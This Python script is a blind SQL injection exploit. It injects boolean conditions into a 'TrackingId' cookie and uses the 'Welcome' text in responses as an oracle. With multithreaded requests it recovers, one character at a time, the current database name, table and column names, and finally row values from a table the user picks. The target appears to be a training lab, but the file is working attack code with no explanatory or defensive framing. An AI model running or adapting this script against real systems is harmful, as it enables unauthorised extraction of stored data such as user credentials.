import  requests
import  urllib3
import  string
import  concurrent.futures
import  sys
from itertools import repeat



rhost = sys.argv[1]

pattern_string = 'Welcome'


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()

# Get the tracking cookie value to inject into.
def login():
	URL = f"{rhost}login"
	response = session.get(rhost)
	print(f"Got tracking cookie: {response.cookies['TrackingId']}")
	return response.cookies['TrackingId']

def length_current_database():
	for db_char_length in list(range(1,30)):

		query = f"' AND length(current_database())='{db_char_length}"
		cookies = {
			"session":session.cookies['session'],
			"TrackingId":f"{session.cookies['TrackingId']}{query}"
		}

		response = requests.get(rhost,cookies=cookies,verify=False)

		if pattern_string in response.text:
			print(f"Current database name is {db_char_length} characters.")
			return db_char_length
			break

def enum_current_database(index):
	for printableCharacter in string.ascii_lowercase:
		query = f"' AND (SUBSTRING(current_database(),{index},1))='{printableCharacter}"
		cookies = {
			"session":session.cookies['session'],
			"TrackingId":f"{session.cookies['TrackingId']}{query}"
		}

		response = requests.get(rhost,cookies=cookies,verify=False)

		if pattern_string in response.text:
			print(f"{printableCharacter}")
			return str(printableCharacter)
			break

def number_of_tables(current_database):
        for num_of_tables_count in list(range(1,10)):

                query = f"' AND (select count(*) from information_schema.tables where table_catalog='{current_database}' and table_schema!='pg_catalog' and table_schema!='information_schema')='{num_of_tables_count}"
                cookies = {
                        "session":session.cookies['session'],
                        "TrackingId":f"{session.cookies['TrackingId']}{query}"
                }

                response = requests.get(rhost,cookies=cookies,verify=False)

                if pattern_string in response.text:
                        print(f"Current database has {num_of_tables_count} tables.")
                        return num_of_tables_count
                        break

def length_of_table_name(iterator):
        for table_char_length in list(range(1,30)):

                query = f"' AND (select length(table_name) from information_schema.tables where table_catalog='postgres' and table_schema!='pg_catalog' and table_schema!='information_schema' limit 1 offset {iterator})='{table_char_length}"
                cookies = {
                        "session":session.cookies['session'],
                        "TrackingId":f"{session.cookies['TrackingId']}{query}"
                }

                response = requests.get(rhost,cookies=cookies,verify=False)

                if pattern_string in response.text:
                        return table_char_length
                        break

def enum_table_names(num_of_tables_count, index):
        for printableCharacter in string.ascii_lowercase:
                query = f"' AND ((SELECT SUBSTRING(table_name,{index},1) from information_schema.tables where table_catalog='postgres' and table_schema!='pg_catalog' and table_schema!='information_schema') limit 1 offset {num_of_tables_count})='{printableCharacter}"
                cookies = {
                        "session":session.cookies['session'],
                        "TrackingId":f"{session.cookies['TrackingId']}{query}"
                }

                response = requests.get(rhost,cookies=cookies,verify=False)

                if pattern_string in response.text:
                        print(f"{printableCharacter}")
                        return str(printableCharacter)
                        break

def number_of_columns(query_table):
	for num_of_columns_count in list(range(1,10)):

		query = f"' AND (select count(*) from information_schema.columns where table_name='{query_table}')='{num_of_columns_count}"
		cookies = {
		"session":session.cookies['session'],
		"TrackingId":f"{session.cookies['TrackingId']}{query}"
		}

		response = requests.get(rhost,cookies=cookies,verify=False)

		if pattern_string in response.text:
			if num_of_columns_count == 1:
				print(f"'{query_table}' table has 1 column.")
			else:
				print(f"'{query_table}' table has {num_of_columns_count} columns.")
			return num_of_columns_count
			break

def length_of_column_name(iterator, query_table):
	for column_char_length in list(range(1,40)):

		query = f"' AND (select length(column_name) from information_schema.columns where table_name='{query_table}' limit 1 offset {iterator})='{column_char_length}"
		cookies = {
		"session":session.cookies['session'],
		"TrackingId":f"{session.cookies['TrackingId']}{query}"
		}

		response = requests.get(rhost,cookies=cookies,verify=False)

		if pattern_string in response.text:
			return column_char_length
			break

def enum_column_names(num_of_columns_count, query_table, index):
	for printableCharacter in string.printable:
		query = f"' AND ((SELECT SUBSTRING(column_name,{index},1) from information_schema.columns where table_name='{query_table}') limit 1 offset {num_of_columns_count})='{printableCharacter}"
		cookies = {
		"session":session.cookies['session'],
		"TrackingId":f"{session.cookies['TrackingId']}{query}"
		}

		response = requests.get(rhost,cookies=cookies,verify=False)

		if pattern_string in response.text:
			print(f"{printableCharacter}")
			return str(printableCharacter)
			break

def num_of_table_rows(query_table):
	for table_row_count in list(range(1,40)):

		query = f"' AND (select count(*) from {query_table})='{table_row_count}"
		cookies = {
		"session":session.cookies['session'],
		"TrackingId":f"{session.cookies['TrackingId']}{query}"
		}

		response = requests.get(rhost,cookies=cookies,verify=False)

		if pattern_string in response.text:
			return table_row_count
			break

def length_of_row_value(iterator, query_table, column_name):
	for value_char_length in list(range(1,400)):

		query = f"' AND (select length({column_name}) from {query_table} limit 1 offset {iterator})='{value_char_length}"
		cookies = {
		"session":session.cookies['session'],
		"TrackingId":f"{session.cookies['TrackingId']}{query}"
		}

		response = requests.get(rhost,cookies=cookies,verify=False)

		if pattern_string in response.text:
			return value_char_length
			break

def enum_row_values(num_of_table_rows, query_table, column_name, index):
	for printableCharacter in string.printable:
		query = f"' AND ((SELECT SUBSTRING({column_name},{index},1) from {query_table}) limit 1 offset {num_of_table_rows})='{printableCharacter}"
		cookies = {
		"session":session.cookies['session'],
		"TrackingId":f"{session.cookies['TrackingId']}{query}"
		}

		response = requests.get(rhost,cookies=cookies,verify=False)

		if pattern_string in response.text:
			print(f"{printableCharacter}")
			return str(printableCharacter)
			break


if __name__ == "__main__":
	# 1. Grab the tracking ID cookie from establishing a session.
	tracking_ID = login()

	# 2. Find out the character length of the current database name to use in finding the name of the current database.
	db_char_length = length_current_database()

	# # 3. Find the name of the current database using the character length of the current database name in variable db_char_length.
	with concurrent.futures.ThreadPoolExecutor() as executor:
		database_name_letters = executor.map(enum_current_database, list(range(1,db_char_length+1)))
	current_database = ''
	for letter in database_name_letters:
		current_database += letter
	print(f"Current database name is {current_database}")

	# # 4. Find the number of tables in the current database.
	num_of_tables_count = number_of_tables(current_database)

	# # 5. Find the character length of each table and then the name of each table.
	# ## Outside loop on the number of tables in the current database.
	for iterator in range(0,num_of_tables_count):
		## Find the character length of the table being looped on.
		table_char_length = length_of_table_name(iterator)
		## Display the character length of the table number being looped on.
		print(f"Table number {iterator+1} character length is {table_char_length}")
		## Find the name of the table being looped on by using the lenght of the table and the iterator as inputs.
		with concurrent.futures.ThreadPoolExecutor() as executor:
			## Note this is how you pass two agruments to a function in this map call: iterator surrounded by repeat and the number of times to perform the operation dicted by the table_char_length value + 1.
			table_name_letters = executor.map(enum_table_names, repeat(iterator), list(range(1,table_char_length+1)))
		## Dipslay the name of the table being looped.
		table_name = ''
		for letter in table_name_letters:
			table_name += letter
		print(f"Table number {iterator+1} name is {table_name}")

# Find the number of columns in a table dictated by the user in an argument being passed.
	query_table = input("Enter table to enumerate: ")
	num_of_columns_count = number_of_columns(query_table)

# Find numebr of rows in the tables
	table_row_count = num_of_table_rows(query_table)
	print(f"Table '{query_table}' has {table_row_count} rows.")

# Find the character length of each column in the table name user parameter.	## Outside loop on the number of tables in the current database.
# Find the name of each column in the table name user paramter.
	for iterator in range(0,num_of_columns_count):
		## Find the character length of the table being looped on.
		column_char_length = length_of_column_name(iterator, query_table)
		## Display the character length of the table number being looped on.
		print(f"Table {query_table} column number {iterator+1} character length is {column_char_length}")
		## Find the name of the table being looped on by using the lenght of the table and the iterator as inputs.
		with concurrent.futures.ThreadPoolExecutor() as executor:
			## Note this is how you pass two agruments to a function in this map call: iterator surrounded by repeat and the number of times to perform the operation dicted by the table_char_length value + 1.
			column_name_letters = executor.map(enum_column_names, repeat(iterator), repeat(query_table), list(range(1,column_char_length+1)))
		## Dipslay the name of the table being looped.
		column_name = ''
		for letter in column_name_letters:
			column_name += letter
		print(f"Table {query_table} column number {iterator+1} name is {column_name}")


	query_column = input("Enter column to enumerate: ")

# def enum_row_values(num_of_table_rows, query_table, column_name, index):
	for iterator in range(0,table_row_count):
		## Find the character length of the table being looped on.
		value_char_length = length_of_row_value(iterator, query_table, query_column)
		## Display the character length of the table number being looped on.
		print(f"Table {query_table} column {query_column} row #{iterator+1} character length is {value_char_length}")
		## Find the name of the table being looped on by using the lenght of the table and the iterator as inputs.
		with concurrent.futures.ThreadPoolExecutor() as executor:
			## Note this is how you pass two agruments to a function in this map call: iterator surrounded by repeat and the number of times to perform the operation dicted by the table_char_length value + 1.
			row_value_letters = executor.map(enum_row_values, repeat(iterator), repeat(query_table), repeat(query_column), list(range(1,value_char_length+1)))
		## Dipslay the name of the table being looped.
		row_value_name = ''
		for letter in row_value_letters:
			row_value_name += letter
		print(f"Table {query_table} column {query_column} row #{iterator+1} value is {row_value_name}")


# Find the values of the user defined column and table.
